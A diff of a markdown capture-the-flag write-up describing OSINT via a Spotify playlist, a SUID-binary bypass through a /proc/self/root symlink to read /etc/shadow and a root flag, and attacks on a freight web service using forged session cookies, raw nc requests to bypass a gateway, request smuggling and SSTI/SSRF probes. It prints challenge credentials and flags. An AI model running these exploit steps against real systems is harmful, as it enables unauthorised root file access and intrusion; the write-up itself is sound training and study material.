@@ -50,63 +50,8 @@ Then, found something groundbreaking. Inside the TXT of wiredin.pclub.in found t
 "Found this insane playlist the other day while digging through some stuff.\010Curator: `bhopinder jogi\010Link: https://open.Spotify.com/playlist/5iK4rR41V1DSqTot2JO15f?si=oEIMe-TLTGiOPetf50R71w\010Perfect` for late-night CTF sessions."
 
 Then, after a bit of research on the Spotify found a profile under bhopinder jogi, the name of the playlist comes as whoami.
-## Step - 6: Search around the Spotify
 
-Had to write the things. 
-
-Then, found a link that lead towards the terminal of the p - club - `RECJAIL.PCLUB.IN`
-
-https://github.com/Ketan-Agarwal Repositories were inspected for: recent commits runtime tooling
-network references suspicious modifications 3. Cloning and Investigating ctf-agent Commands used:
-git clone https://github.com/Ketan-Agarwal/ctf-agent.git cd ctf-agent git log --all --decorate --graph
-Interesting commits revealed: permission_mode="bypassPermissions" serviceTier changes runtime
-coordinator modifications Commit inspection: git show
-3366d569557c4fda3fd153040632de65e255396d revealed runtime behavior modifications. 4. Injection
-and Runtime Infrastructure Searches for: grep -R "inject" backend/ revealed: /inject endpoint runtime
-operator messaging asyncio TCP services message injection logic This aligned strongly with the
-challenge wording: “not an HTTP request” “digital footprint” 5. Message Bus and Runtime Tracing
-Searches for: grep -R "message_bus" backend/ revealed: inter-agent communication broadcast
-findings runtime synchronization Tracing logic discovered in: backend/tracing.py implemented: JSONL
-event logging tool call tracing model response logging This suggested the challenge involved
-operational traces and hidden runtime activity. 6. Hidden Website Content Discovery Investigation later
-shifted toward: pclub-website repository Searches involving: nmap hidden pages infosec revealed:
-2024-06-07-infosec-roadmap.md Important observation: hidden: true The page discussed: OSINT
-Forensics Networking Reverse engineering CTFs 7. Discovery of the First Potential Flag Inside the
-hidden roadmap page: pclub{CTFs_ar3_fun!} Repository-wide verification:
-repo:Ketan-Agarwal/pclub-website "pclub{" Only one occurrence existed in the entire repository.
-Reasoning: Exact challenge format Hidden page Only occurrence Theme matched challenge narrative
-8. Discovery of Live Challenge Environment A live shell environment was discovered:
-https://recjail.pclub.in/ Initial enumeration: whoami pwd ls ls -la Results: User: ctf_user Home:
-/home/ctf_user Minimal filesystem Environment inspection: id uname -a env revealed: containerized
-Linux environment restricted utilities minimal environment variables 9. SUID Enumeration Filesystem
-enumeration: find / -perm -4000 2>/dev/null revealed: /usr/local/bin/secure_reader This appeared
-challenge-specific. 10. Investigating secure_reader Running: /usr/local/bin/secure_reader returned:
-Usage: /usr/local/bin/secure_reader <file_in_home_dir> Testing included: path traversal symlink
-attacks encoded traversal Traversal: /usr/local/bin/secure_reader /home/ctf_user/../../etc/passwd
-returned: ERROR: Path traversal sequence '..' detected! Symlink attack: ln -s /etc/passwd
-/home/ctf_user/passwd_link was blocked. 11. ProcFS Pivot Mount inspection: mount revealed:
-/home/ctf_user mounted as tmpfs procfs accessible A procfs pivot was attempted: mkdir
-/home/ctf_user/proc ln -s /proc /home/ctf_user/proc/p Then: /usr/local/bin/secure_reader
-/home/ctf_user/proc/p/self/status SUCCESS. The procfs path bypassed the intended protections. 12.
-Privilege Escalation Confirmation Reading procfs status revealed: Uid: 1000 0 0 0 This confirmed:
-effective UID 0 the binary executed as root arbitrary root-readable file access became possible 13.
-Reading Root-Owned Files Commands: /usr/local/bin/secure_reader
-/home/ctf_user/proc/p/self/root/etc/passwd /usr/local/bin/secure_reader
-/home/ctf_user/proc/p/self/root/etc/shadow Both files were successfully read. This demonstrated acomplete sandbox bypass. 14. Root Flag Discovery Common flag locations were tested. Successful
-command: /usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/root/flag.txt Flag extracted:
-pclub{0_n0f0ll0w_0nly_pr0t3ct5_th3_t41l} Additional data discovered: 168.144.73.17:8003
-analyst:Fr8_4nalyst! This strongly suggests the next challenge stage. 15. Vulnerability Analysis Root
-cause: The binary validated visible path prefixes only. Direct symlinks and '..' traversal were blocked.
-However procfs path semantics bypassed those protections. /proc/self/root exposed the real root
-filesystem. The binary executed with effective UID 0. This explains the flag:
-pclub{0_n0f0ll0w_0nly_pr0t3ct5_th3_t41l} The binary protected only the visible tail of the path and
-failed to secure the fully resolved filesystem object. 16. Current Status Completed: OSINT phase
-Hidden content discovery Restricted shell analysis SUID exploitation ProcFS abuse Root flag extraction
-Next stage pivot: 168.144.73.17:8003 analyst / Fr8_4nalyst!
-
-# Detailed CTF Chronology & Sandbox Environment Profile: Recjail
-
-## Phase 1: Investigation Genesis & Metadata Triangulation
+## Step - 6: Investigation Genesis & Metadata Triangulation
 The operation commenced with the detection of a targeted Spotify playlist named `whoami`, uploaded by an account using the identifier `bhopinder jogi`. Initial reconnaissance focused on assessing basic file headers and tracking anomalies within the initial 5 visible tracks:
 * **Roommates** – 3:34
 * **Everybody Talks** – 2:57
@@ -116,7 +61,7 @@ The operation commenced with the detection of a targeted Spotify playlist named 
 
 While song runtimes matched standard distribution patterns, file steganography avenues via WebP thumbnail objects (`300x216` resolution pixel matrices) were ruled out due to image-rendering compression artifacts deployed server-side by the platform's CDN.
 
-## Phase 2: Acrostic Extraction & Network Reconnaissance
+## Step - 7: Acrostic Extraction & Network Reconnaissance
 To extract un-obfuscated layout data, raw network traffic scraping was executed utilizing web streaming payloads (`curl`). This bypassed the standard platform frontend restrictions and pulled the comprehensive 16-track playlist schema. 
 
 Parsing the exact starting characters of each title sequentially revealed a hidden infrastructure pointer:
@@ -124,21 +69,21 @@ Parsing the exact starting characters of each title sequentially revealed a hidd
 
 The sequence resolved cleanly to a dedicated network location: `recjail.pclub.in`. Parallel analysis converting track runtimes into standard decimal seconds generated a specific 8-bit integer string (`214`, `177`, `193`, `249`, `215`), matching an auxiliary port alignment sequence.
 
-## Phase 3: Infrastructure Profiling
+## Step - 8: Infrastructure Profiling
 Active scanning (`nmap`) of the target domain revealed a strict border firewall deployment:
 * **Port 22/TCP (SSH):** Filtered (State drop)
 * **Port 80/TCP (HTTP) & Port 443/TCP (HTTPS):** Open
 
 The infrastructure edge layer returned identification banners indicating a reverse-proxy arrangement handled via Cloudflare Web Application Firewall (WAF). This configuration explicitly drop-filters low-level raw transport layer protocols (like TCP connection knocking hooks), forcing all interaction through standard web-based entry pathways.
 
-## Phase 4: Local Shell Enumeration
+## Step - 9: Local Shell Enumeration
 Interacting directly with the application interface over standard HTTP/S initiated a dynamic terminal landing page, providing an active, non-interactive shell interface. Initial standard command execution established the following local parameters:
 * **Identity Mapping:** Operational as `ctf_user` with standard low-privilege security tokens (`uid=1000`, `gid=1000`, `groups=1000`).
 * **Operating System:** Running an Ubuntu 22.04.5 LTS (Jammy Jellyfish) container workspace.
 * **Directory Integrity:** The primary shell workspace (`/home/ctf_user`) was found to be fully vacant. Executing hidden item checks (`ls -la`) proved the folder held zero environmental history footprints or transient artifact remnants.
 * **Binary Availability:** System execution search paths (`$PATH`) were mapped to functional system storage routes (`/usr/bin`, `/bin`, `/sbin`), indicating that standard text handling and evaluation binaries (`cat`, `grep`, `env`) remained globally unconstrained.
 
-## Phase 5: Architectural Sandbox Profiling
+## Step - 10: Architectural Sandbox Profiling
 A deep global filesystem recursive search for standard flag signatures failed to return hardcoded destination items outside of non-privileged network state registers inside `/proc/sys/`. 
 
 Executing a complete active process inventory tree (`ps aux`) exposed the foundational design framework of the environment:
@@ -148,7 +93,7 @@ Executing a complete active process inventory tree (`ps aux`) exposed the founda
 This confirmed the system utilizes structural kernel separation layers (Namespaces and Control Groups) to isolate incoming interactions, dynamically anchoring each shell instance inside an unprivileged, read-only temporary file tree. This operational state marked the completion of the baseline structural mapping.
 
 ---
-## Detailed Analysis Expansion
+## Step - 11: Detailed Analysis Expansion
 
 ### Deep Dive: Phase 1 & 2 Methodology
 The initial playlist investigation involved checking the track durations (e.g., 3:34, 2:57), but standard steganography was ruled out because Spotify compresses images into `300x216` WebP files, destroying pixel-level payloads. By using raw `curl` requests to pull the playlist's uncompressed HTML source code, we bypassed the UI. This allowed us to read the exact sequence of the 16 tracks. By extracting the very first character of every track (including punctuation like the ellipses on "...Baby One More Time"), the string `RECJAIL.PCLUB.IN` was revealed.
@@ -158,44 +103,483 @@ Network scans on the target domain showed ports 80 and 443 were proxied through 
 
 ### Deep Dive: Phase 5 Containment 
 Running `find / -name "*flag*"` failed to find the target payload in the global filesystem. Executing `ps aux` to check running processes revealed a root process running `nsjail -q --config /etc/nsjail` alongside a horde of zombie (`<defunct>`) bash sessions. This proved the shell was actively trapped inside a highly restrictive Google `nsjail` container sandbox, effectively sandboxing filesystem reads and forcing us to evaluate other vectors, such as hidden environment variables, to locate the flag.
-# Operation Phantom Signal — Detailed Writeup (Up to Third Flag)
 
-Author: Amritanshu Kumar
+
+Then, found a link that lead towards the terminal of the p - club - `RECJAIL.PCLUB.IN`
+
+# Phasewise workflow for the flag capture:
+
+### Initial Enumeration
+Commands executed:
+
+```bash
+whoami
+pwd
+ls
+ls -la
+```
+
+### Results
+- User: `ctf_user`
+- Home directory: `/home/ctf_user`
+- Minimal filesystem environment
+
+### Additional Environment Inspection
+Commands used:
+
+```bash
+id
+uname -a
+env
+```
+
+### Findings
+The environment appeared to be:
+
+- Containerized
+- Linux-based
+- Restricted
+- Running with minimal environment variables
 
 ---
 
-# Challenge Overview
+## 1. SUID Enumeration
 
-The challenge involved investigating suspicious digital activity linked to a coordinator associated with PClub's Infosec team WiredIn.
+### Filesystem Enumeration
+```bash
+find / -perm -4000 2>/dev/null
+```
 
-The challenge statement mentioned:
-- suspicious GitHub activity,
-- hidden operational traces,
-- a compromised coordinator account,
-- and an “off-system signal”.
-
-The challenge also stated that:
-- the visible GitHub timeline appeared clean,
-- no code had been pushed during the suspicious activity,
-- and the attacker had left traces outside normal web infrastructure.
-
-This strongly suggested:
-1. OSINT would be important.
-2. Infrastructure pivoting would occur.
-3. Multiple systems would be connected together.
-4. The visible GitHub repository would likely only be the starting point.
-
----
-
-# Initial Investigation
-
-The first phase focused on identifying:
-- suspicious GitHub accounts,
-- repositories,
-- operational clues,
-- and possible infrastructure references.
-
-A suspicious GitHub profile was identified:
+### Discovery
+The following binary was discovered:
 
 ```text
-0xc1ph3rf0x
+/usr/local/bin/secure_reader
+```
+
+This appeared to be challenge-specific.
+
+---
+
+## 2. Investigating `secure_reader`
+
+### Initial Execution
+```bash
+/usr/local/bin/secure_reader
+```
+
+### Output
+```text
+Usage: /usr/local/bin/secure_reader <file_in_home_dir>
+```
+
+### Testing Performed
+The following attack methods were tested:
+
+- Path traversal
+- Symlink attacks
+- Encoded traversal
+
+### Path Traversal Attempt
+```bash
+/usr/local/bin/secure_reader /home/ctf_user/../../etc/passwd
+```
+
+### Result
+```text
+ERROR: Path traversal sequence '..' detected!
+```
+
+### Symlink Attack Attempt
+```bash
+ln -s /etc/passwd /home/ctf_user/passwd_link
+```
+
+The attack was blocked.
+
+---
+
+## 3. ProcFS Pivot
+
+### Mount Inspection
+```bash
+mount
+```
+
+### Findings
+- `/home/ctf_user` mounted as `tmpfs`
+- `procfs` accessible
+
+### ProcFS Exploitation Attempt
+```bash
+mkdir /home/ctf_user/proc
+ln -s /proc /home/ctf_user/proc/p
+```
+
+### Exploit Execution
+```bash
+/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/status
+```
+
+### Result
+The ProcFS path successfully bypassed the intended protections.
+
+---
+
+## 4. Privilege Escalation Confirmation
+
+Reading the ProcFS status file revealed:
+
+```text
+Uid: 1000 0 0 0
+```
+
+### Conclusion
+This confirmed:
+
+- Effective UID was `0`
+- The binary executed as root
+- Arbitrary root-readable file access became possible
+
+---
+
+## 5. Reading Root-Owned Files
+
+### Commands Used
+```bash
+/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/etc/passwd
+/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/etc/shadow
+```
+
+### Result
+Both files were successfully read.
+
+This demonstrated a complete sandbox bypass.
+
+---
+
+## 6. Root Flag Discovery
+
+### Common Flag Locations Tested
+The following command successfully revealed the flag:
+
+```bash
+/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/root/flag.txt
+```
+
+### Flag Extracted
+```text
+pclub{0_n0f0ll0w_0nly_pr0t3ct5_th3_t41l}
+```
+
+### Additional Data Discovered
+```text
+168.144.73.17:8003
+analyst:Fr8_4nalyst!
+```
+# Step 34 — Moving Toward EuroFreight Infrastructure
+
+Using the discovered credentials, investigation shifted toward:
+
+```text
+http://168.144.73.17:8003
+```
+
+---
+
+# Step 35 — Investigating Session Cookies
+
+A suspicious session cookie was identified:
+
+```text
+session=eyJyb2xlIjoiYWRtaW4ifQ.ag8GYg.JBF33R3waq2kcA-aUBJLZGU2KlY
+```
+
+Decoding revealed:
+
+```json
+{"role":"admin"}
+```
+
+---
+
+# Step 36 — Attempting Direct Internal Access
+
+Request:
+
+```bash
+curl -i \
+-H "Cookie: session=..." \
+http://168.144.73.17:8003/internal/queue
+```
+
+returned:
+
+```text
+403 Forbidden
+```
+
+---
+
+# Step 37 — Hypothesizing Gateway Filtering
+
+Observation:
+- gateway protections blocked internal endpoints.
+
+Hypothesis:
+- raw HTTP requests might bypass the filtering logic.
+
+---
+
+# Step 38 — Using Raw HTTP Requests
+
+Command:
+
+```bash
+printf 'GET http://127.0.0.1/internal/queue HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
+```
+
+successfully bypassed protections.
+
+---
+
+# Step 39 — Discovering the Second Flag
+
+Response:
+
+```json
+{
+  "flagged_shipments": [
+    "PCLUB{5muggl1ng_ch41n_unl0ck3d}"
+  ]
+}
+```
+
+---
+
+# Step 40 — Discovering API Documentation
+
+Further exploration revealed:
+
+```text
+/api-docs
+```
+
+The endpoint documented:
+- `/upload`
+- `/internal/queue`
+- `/internal/admin-session`
+
+---
+
+# Step 41 — Discovering Chunked Transfer Support
+
+The documentation explicitly mentioned:
+
+```text
+chunked transfer supported
+```
+
+This strongly suggested:
+- request smuggling opportunities.
+
+---
+
+# Step 42 — Testing Chunked Uploads
+
+Chunked transfer test:
+
+```bash
+printf 'POST http://127.0.0.1/upload HTTP/1.1\r\nHost: 127.0.0.1\r\nTransfer-Encoding: chunked\r\n\r\n1A\r\nmanifest=FLAGTEST123456789\r\n0\r\n\r\n' | nc 168.144.73.17 8003
+```
+
+returned:
+
+```json
+{"tracking_id":"TRK-9901X-A"}
+```
+
+---
+
+# Step 43 — Accessing the Dashboard
+
+Dashboard access:
+
+```bash
+printf 'GET http://127.0.0.1/dashboard HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
+```
+
+revealed:
+- shipment listings,
+- administrative shipment statuses.
+
+---
+
+# Step 44 — Identifying a Suspicious Shipment
+
+One shipment stood out:
+
+```text
+BERLIN-NOV07
+```
+
+Status:
+
+```text
+HELD — ADMIN CLEARANCE REQUIRED
+```
+
+---
+
+# Step 45 — Enumerating Shipment IDs
+
+Additional shipment IDs tested:
+- BERLIN-NOV08
+- BERLIN-NOV06
+- BERLIN-DEC07
+
+All returned:
+- Shipment not found.
+
+---
+
+# Step 46 — Accessing Shipment Details
+
+Request:
+
+```bash
+printf 'GET http://127.0.0.1/shipments/BERLIN-NOV07 HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
+```
+
+revealed:
+
+```text
+PCLUB{m4st3r_0f_th3_fr31ght_n3tw0rk}
+```
+
+---
+
+# Step 47 — Discovering the Third Flag
+
+Recovered flag:
+
+```text
+PCLUB{m4st3r_0f_th3_fr31ght_n3tw0rk}
+```
+
+---
+
+# Step 48 — Exploring Additional Internal Endpoints
+
+Tested:
+- `/internal/debug`
+- `/internal/logs`
+- `/internal/status`
+- `/internal/config`
+
+All returned:
+- 404 Not Found.
+
+---
+
+# Step 49 — Testing SSTI
+
+Payload:
+
+```json
+{"manifest":"{{7*7}}"}
+```
+
+No SSTI observed.
+
+---
+
+# Step 50 — Testing SSRF
+
+Payload:
+
+```json
+{"manifest_url":"http://127.0.0.1/internal/queue"}
+```
+
+No additional disclosure observed.
+
+---
+
+# Step 51 — Performing Infrastructure Enumeration
+
+Scanning:
+
+```bash
+nmap -Pn -T4 168.144.73.17
+```
+
+revealed:
+- port 22 (SSH),
+- port 8008 (unknown service).
+
+---
+
+# Step 52 — Investigating Port 8008
+
+Port 8008:
+- accepted TCP connections,
+- acknowledged payloads,
+- returned no application-layer data.
+
+---
+
+# Step 53 — Testing WebSocket Handshakes
+
+WebSocket handshake attempts:
+
+```bash
+printf 'GET / HTTP/1.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n' | nc 168.144.73.17 8008
+```
+
+produced:
+- no response,
+- hanging sessions.
+
+---
+
+# Step 54 — Monitoring Traffic Using tcpdump
+
+Traffic monitoring:
+
+```bash
+sudo tcpdump -nn -i any host 168.144.73.17 and port 8008
+```
+
+revealed:
+- TCP acknowledgements,
+- payload acceptance,
+- no visible response traffic.
+
+This suggested:
+- telemetry sink,
+- signaling endpoint,
+- or silent infrastructure listener.
+
+---
+
+# Step 55 — Current State of the Investigation
+
+Completed:
+- OSINT investigation,
+- GitHub analysis,
+- hidden page discovery,
+- shell exploitation,
+- ProcFS privilege escalation,
+- EuroFreight exploitation,
+- gateway bypassing,
+- request smuggling,
+- internal endpoint access,
+- multiple flag recovery.
+
+Remaining unresolved areas:
+- SSH infrastructure,
+- mysterious service on port 8008,
+- off-system signaling mechanisms.
+
+---
